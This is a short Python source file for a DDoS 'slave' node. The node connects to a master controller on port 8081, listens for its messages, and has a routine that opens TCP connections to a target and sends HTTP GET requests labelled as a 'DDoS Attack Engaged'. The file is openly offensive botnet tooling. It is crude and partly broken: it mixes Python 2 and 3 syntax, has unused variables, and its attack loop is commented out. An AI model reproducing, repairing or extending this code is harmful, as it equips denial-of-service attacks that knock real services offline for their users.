#!/usr/bin/python
import time, os, sys, string
from socket import *  #importing the socket library for network connections

class Slave():
    def __init__(self, host, port, sock=None):
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message='asdf'
        conn=input("How many connections do you want to make: ")
        ip = gethostbyname(self.host)
        self.num_connections = 0

        # connect to master
        self.masterHost = 'localhost'
        self.masterPort = 8081
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send('I want to connect with you')

    def acceptMessages(self):
        msg_buf = self.sockMaster.recv(64)
        if len(msg_buf) > 0:
          print(msg_buf)

    def dos(self):
        try:
            self.ddos = socket(AF_INET, SOCK_STREAM)
            self.ddos.connect((self.host, self.port))
            self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
        except error, msg:
            self.num_connections = self.num_connections+1
            print("|[Connection Failed] | %d", self.num_connections )
        print ("|[DDoS Attack Engaged] |")
        #ddos.close()

if __name__ == '__main__':
  slaveNode = Slave('localhost', 8080)

  while(1):
#for i in xrange(conn):
    #slaveNode.dos()
    slaveNode.acceptMessages()
